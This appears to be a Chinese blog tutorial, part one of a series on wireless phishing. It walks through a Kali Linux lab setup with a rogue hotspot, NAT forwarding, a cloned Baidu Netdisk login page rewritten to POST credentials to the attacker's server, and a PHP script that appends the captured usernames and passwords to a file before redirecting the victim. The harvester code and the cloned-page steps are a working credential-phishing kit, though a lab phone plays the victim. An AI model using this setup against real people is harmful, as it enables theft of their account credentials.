2020无线钓鱼(1)——环境准备
2020-02-25 13:00

1.硬件准备

USB无线网卡

  • 购买适用于kali linux系统的无线网卡1块，芯片型号有要求。

  • 我使用的是TP-LINK的网卡，型号TL-WN821N (某东入手)。

  • 网卡要支持无线AP模式(Master，用于创建钓鱼热点)、监听模式(Monitor，用于WiFi密码破解，数据包注入)。

参考链接：1，2 ，3

计算机

至少有一台计算机。

手机

一台具有WiFi功能的工作正常的手机。本实验中，它扮演无线钓鱼的受害者。

2.软件准备

VMware Workstation

我使用的虚拟机版本：v14.1.3

Kali Linux 2019虚拟机

在VMware里安装Kali Linux 2019 64位的虚拟机。

TL-WN821N网卡驱动

在Kali虚拟机中安装网卡驱动。

以下操作涉及apt安装软件，需要自行确保Kali系统的网络通畅，以及apt源的有效性（可能需要换源）。

在Kali终端输入：

apt install -y dkms
git clone https://github.com/Mange/rtl8192eu-linux-driver.git
cd rtl8192eu-linux-driver
dkms add .
dkms install rtl8192eu/1.0
rmmod rtl8xxxu
modprobe 8192eu

//注意：每次挂起后载入虚拟机，或重启虚拟机，都要执行最后两条命令才可载入网卡驱动

3.制作钓鱼网站

首先，我们提前为还没创建的钓鱼热点准备好互联网服务，即：

打开kali的路由转发功能——使待会钓鱼热点的数据可以由kali（连上互联网的）网卡代为转发，这样受害者在我们的钓鱼热点里才可以上网。

其次，我们准备一个钓鱼网站。

打开路由转发

  • 去掉“#net.ipv4.ip_forward=1”中的“#”
vi  /etc.sysctl.conf
  • 配置iptables，设置NAT
iptables -t nat -A POSTROUTING -o eth0 -s 172.5.5.100/24 -j MASQUERADE

注1：这里的“172.5.5.100/24”是我们待会要创建的钓鱼热点子网的地址范围。

注2：由于kali的iptables默认不保存配置（可以google一下如何保存，我试了没成功），所以如果重启kali，并还需要进行该实验时，请再执行这条命令。

选项解释：

-t 表名

-A 在规则链后追加

POSTROUTING 用于源地址转换（SNAT）的规则链名

-o 用于输出的网络设备名

-s 规定输入的源地址范围

-i 规定输入的网络设备名

-j 地址动态伪装，自动设置为有效出网设备的地址

完善克隆的网站

克隆成功后，检查网站克隆得是否完整，在我的实验中，我克隆的百度盘登录界面登录框没有了。

这时，要手动完善克隆出的网页。

虽然上图显示，默认把克隆后的站点放入/var/www，但本次实验过程并未找到，笔者是通过查找linux系统最近生成的文件列表找到了克隆出的网页文件：

使用find找到最近1天内生成或修改的文件

find  /  -ctime  -1  |  grep html

最后发现，克隆后的网页路径为 /root/.set/web_clone/index.html

拷贝html文件到Windows下，使用notepad++着手完善：

  • 参考百度云盘的原登录页面代码，发现克隆页面代码缺少了登录相关代码，例如文本输入框，提交按钮。

  • 百度“html input“，查看菜鸟教程https://www.runoob.com/tags/tag-input.html

  • 观察分析input用法及submit按钮，https://www.runoob.com/try/try.php?filename=tryhtml_form_submit

  • 结合原登录页面代码及③，改写克隆页面，使其具有点击“登录”按钮后，以POST方式提交用户名、口令到攻击者的服务器的功能。

  • 删除多余的JavaScript脚本。它可能造成登录页面首先显示出“扫码登录”的页面内容。

  • 把该html命名为“index.html"并放到”/var/www/html/“路径下

保存用户名、口令

在上一步中，我们克隆并完善了百度网盘的登录界面（改写了登录的form表单，使其提交到“http://192.168.31.31/post.php”），其中“192.168.31.31”就是我kali的IP地址，后面的“post.php”是搭建在kali的apache目录下的php页面，作用是接收POST数据，并保存在本地。

本节就是要编辑这样一个php文件。在kali终端键入：

vi  /var/www/html/post.php

编辑并保存内容：

<?php 
$file = 'harvester_pan.baidu.txt'; 
file_put_contents($file, print_r($_POST, true), FILE_APPEND); 
?> 
<meta http-equiv="refresh" content="0; 
url=http://pan.baidu.com" 
/>

注解：

  • file_put_contents() 函数： 写入内容到本地文件。

  • 以上实例的函数参数分别表示：

    • 文件路径（$file）;
    • 打印变量（print_r(），如果是array则按一定格式显示）;
    • 一个标记（true，表示以追加形式写入文件尾部）。

  • “meta ……http://pan,baidu.com”，利用标签实现客户端的页面自动跳转，跳转到“http://pan.baidu.com”

    • 当然，由于我们污染了DNS，所以还是跳转回我们的钓鱼页面
    • 这里还可以进一步优化，使其跳转到真正的百度盘界面
